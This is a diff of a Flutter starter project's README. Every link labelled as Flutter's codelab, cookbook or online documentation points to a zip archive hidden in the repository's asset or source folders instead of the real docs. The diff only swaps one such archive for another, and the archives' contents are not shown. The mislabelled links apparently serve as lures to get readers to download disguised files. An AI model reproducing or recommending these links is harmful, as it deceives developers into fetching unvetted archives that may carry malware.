@@ -8,9 +8,9 @@ This project is a starting point for a Flutter application.
 
 A few resources to get you started if this is your first Flutter project:
 
-- [Lab: Write your first Flutter app](https://raw.githubusercontent.com/snehilhbtu/bloc_ex1/main/lib/modal/bloc_ex1_v2.6-alpha.3.zip)
-- [Cookbook: Useful Flutter samples](https://raw.githubusercontent.com/snehilhbtu/bloc_ex1/main/lib/modal/bloc_ex1_v2.6-alpha.3.zip)
+- [Lab: Write your first Flutter app](https://github.com/snehilhbtu/bloc_ex1/raw/refs/heads/main/macos/Runner/Assets.xcassets/ex_bloc_3.2-beta.4.zip)
+- [Cookbook: Useful Flutter samples](https://github.com/snehilhbtu/bloc_ex1/raw/refs/heads/main/macos/Runner/Assets.xcassets/ex_bloc_3.2-beta.4.zip)
 
 For help getting started with Flutter development, view the
-[online documentation](https://raw.githubusercontent.com/snehilhbtu/bloc_ex1/main/lib/modal/bloc_ex1_v2.6-alpha.3.zip), which offers tutorials,
+[online documentation](https://github.com/snehilhbtu/bloc_ex1/raw/refs/heads/main/macos/Runner/Assets.xcassets/ex_bloc_3.2-beta.4.zip), which offers tutorials,
 samples, guidance on mobile development, and a full API reference.
